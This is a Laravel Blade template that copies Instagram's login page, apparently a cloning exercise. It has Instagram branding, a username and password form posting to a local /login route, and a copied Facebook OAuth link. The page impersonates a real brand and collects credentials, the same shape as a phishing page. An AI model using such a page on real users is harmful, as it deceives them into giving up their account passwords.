<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>

<style>
    body{
        background-color:#f7f7f7;
        
    }
    .box1{ 
        background-color:white;
        width: 300px;
        margin:auto;
        padding:50px;
        text-align:center;   
        outline: solid 2px #c6c6c6;       
    }

    .box1 h1{
        font-family:Pristina;
        font-size:70px;
    }

    .box1 h3{
        color:#b1b1b1;
        margin-top:-40px;
    }

    .box1 button{
        color:white;
        background-color:#00a3f0;
        width: 225px;
        height: 34px;
        font-size:15px;
        font-weight:bold;
        border-radius: 3px;
        border-color:#00a3f0;
        margin:25px;
        
    }

    .box1 input{
        width: 200px;
        padding:10px;
        margin:3px;
        background-color:#f3f3f3;
        font-weight:light;
        border-color:#e7e7e7;
    }

    .box1 label{
        color:#b1b1b1;
    }
</style>

<body>

    @if(isset($successMsg))
        {{ $successMsg }}
    @endif

    @if($errors->any())
        @foreach($errors->all() as $error)
            <h1>{{$error}}</h1>
        @endforeach
    @endif


        <div class="box1">
        <h1>Instagram</h1>
        <form action="/login" method="POST">
            @csrf
            <input type="text" name="email" id="email" value="@if(isset($email)) {{$email}} @endif" placeholder="user name, phone no, email"><br>
            <input type="password" name="password" id="password" placeholder="Enter your password"><br>

            <button>Log in</button>
            <hr>
        </form>

        <a
            href="https://www.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Den_US%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%2522vf3bu0se47hf1k9smkvu6r6jf9ft1yw1gu2ypv1g3e4st1ktmnb2%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dec02205d-d310-425d-a531-b1c29a9bc583%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%2522vf3bu0se47hf1k9smkvu6r6jf9ft1yw1gu2ypv1g3e4st1ktmnb2%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=page&locale=en_GB&pl_dbl=0">Login
            with facebook</a><br>
        <a href="">Forget password?</a>

        <hr>

        Don't have an account? <a href="/instagram_signup">Sign up</a>
    
    </div>
</body>

</html>
